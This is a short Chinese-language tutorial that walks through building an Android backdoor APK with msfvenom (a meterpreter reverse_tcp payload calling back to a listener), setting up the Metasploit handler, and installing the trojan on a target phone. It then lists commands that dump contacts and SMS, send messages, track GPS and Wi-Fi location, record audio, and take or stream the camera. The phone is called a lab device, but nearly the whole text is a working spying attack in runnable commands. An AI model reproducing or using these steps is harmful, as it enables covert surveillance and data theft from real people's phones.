# 一、环境准备

1. MSF-Metasploit Framework
2. 一台安卓手机或者模拟器

# 二、木马生成

1. 生成一个APK后门

```
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.70.3 LPORT=4567 R>k.apk
```

# 三、配置监控

1. 启动msf   终端内输入：`msfconsole` 启动msf![1643003592876](https://image.201068.xyz/assets/1643003592876.png)

2. 载入监控模块  msf中输入：  

   `use exploit/multi/handler`

3. 载入payload MSF终端中输入： 

   `set payload android/meterpreter/reverse_tcp`

   ![1643003612323](https://image.201068.xyz/assets/1643003612323.png)

4. 配置payload  MSF终端中输入：`show options`

5. 配置监控IP MSF中输入：`set lhost  192.168.70.3`

6. 配置监控端口  MSF中输入：`set lport 4567`

7. 执行监控  msf终端中输入： 

   `run`![1643003633911](https://image.201068.xyz/assets/1643003633911.png)

# 四、攻击利用

1. 将木马上传到靶机

2. 在靶机上执行木马

3. 完成攻击利用

   ![1643003654523](https://image.201068.xyz/assets/1643003654523.png)



获取手机通讯录： `dump_contacts`

获取短信记录：`dump_sms`

控制实验手机发短信：`send_sms -d 15330252525 -t "hello"`

获取实验手机GPS定位信息：`geolocate`

获取实验手机Wi-Fi定位信息：`wlan_geolocate`

控制实验手机录音：`record_mic -d  5`

获取实验手机相机设备：`webcam_list`

控制实验手机拍照 ：`webcam_snap`

**直播实验手机摄像头**：`webcam_stream`